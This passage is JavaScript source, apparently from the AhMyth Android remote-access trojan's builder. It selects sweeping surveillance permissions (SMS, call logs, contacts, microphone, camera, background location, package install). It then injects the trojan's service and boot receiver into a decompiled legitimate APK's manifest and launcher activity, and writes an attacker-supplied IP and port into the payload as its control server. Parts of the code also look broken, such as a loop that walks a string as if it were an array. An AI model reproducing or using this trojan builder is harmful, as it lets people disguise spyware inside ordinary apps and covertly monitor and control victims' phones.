          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


        for (var i = 0; i < permArray.length; i++) {
            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
            if (firstPart.indexOf(permissionName) == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            }
        }

        return (firstPart + lastPart);

    };


    // function to use onBoot method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the device rebooted
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is working almost on every app 
    $appCtrl.BindOnBoot = (apkFolder) => {
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            var ahmythReciver = CONSTANTS.ahmythReciver;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            $appCtrl.Log();
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log();
                    return;
                }
                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

            });

        });

    };



    // function to use OnLauncher method 
    // it will bind ahmyth to orginal app 
    // and ahmyth will start once the orginal app started
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is not working on every app (unstable)
    $appCtrl.BindOnLauncher = (apkFolder) => {

        $appCtrl.Log('Finding launcher activity from AndroidManifest.xml...');
        $appCtrl.Log();
        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();
                return;
            }

            var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
            if (launcherPath == -1) {
                $appCtrl.Log("Cannot find the launcher activity in the Manifest!", CONSTANTS.logStatus.FAIL);
                $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
                $appCtrl.Log();
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            $appCtrl.Log('Modifying AndroidManifest.xml...');
            $appCtrl.Log();
            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log();
                    return;
                }


       



                $appCtrl.Log("Fetching launcher activity...");
                $appCtrl.Log();
                fs.readFile(launcherPath, 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log('Please use the "On Boot" method...', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log('to Template this APK!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                    }


                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;


                    var key = CONSTANTS.orgAppKey;
                    $appCtrl.Log("Modifiying launcher activity...");
                    $appCtrl.Log();
                    var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                    fs.writeFile(launcherPath, output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
                            $appCtrl.Log();
                            return;
                        }

                        $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

                    });


                });
            });

        });

    }

    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        if (!ip) {
            $appCtrl.Log('IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            $appCtrl.Log();
            return;
        } else if (!port) {
            port = CONSTANTS.defaultPort;
        } else if (port > 65535 || port <= 1024) {
            $appCtrl.Log('Choose ports from range (1024,65535)', CONSTANTS.logStatus.FAIL);
            $appCtrl.Log();
            return;
        }


        // open ahmyth source file and modifiy the ip and port to the users' ones
        var ipPortFile = path.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkSourceName + '...');
        $appCtrl.Log();
        fs.readFile(ipPortFile, 'utf8', (error, data) => {
            if (error) {
                $appCtrl.Log('Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();
                return;
            }

            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkSourceName + '...');
            $appCtrl.Log();
            // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
            var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
            $appCtrl.Log('Adding source ip:port to ' + ipPortFilePath + '...');
            $appCtrl.Log();
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                if (error) {
                    $appCtrl.Log('Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log();
                    return;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);

                } else {
                    // generate a solid ahmyth apk
                    var filePath = $appCtrl.filePath;
                    if (filePath == null) {
                        $appCtrl.Log("Browse an apk file which you want to bind", CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log();
                        return;
                    } else if (!filePath.includes(".apk")) {
                        $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log();
                        return;
                    }


                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    $appCtrl.Log('Decompiling ' + filePath + "...");
                    $appCtrl.Log();
                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                        (error, stdout, stderr) => {
                            if (error !== null) {
                                $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
                                fs.writeFile(path.join(logPath, 'Decompiling.log'), `Copy and past this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                                $appCtrl.Log('Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
                                $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                                $appCtrl.Log();
                                return;
                            }

                            if ($appCtrl.bindApk.method == 'BOOT')
                                $appCtrl.BindOnBoot(apkFolder);

                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                $appCtrl.BindOnLauncher(apkFolder);


                        });
                }
            });
        });
    }










});



//function to extract the launcher activity from the orginal app
function GetLauncherPath(manifest, smaliPath) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf
   (
    '"android.intent.action.MAIN"',
    '"android.intent.category.LAUNCHER"'
    +
    '"android.intent.action.MAIN"',
    '"android.intent.category.INFO"'
    );
    var indexOfActivity = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
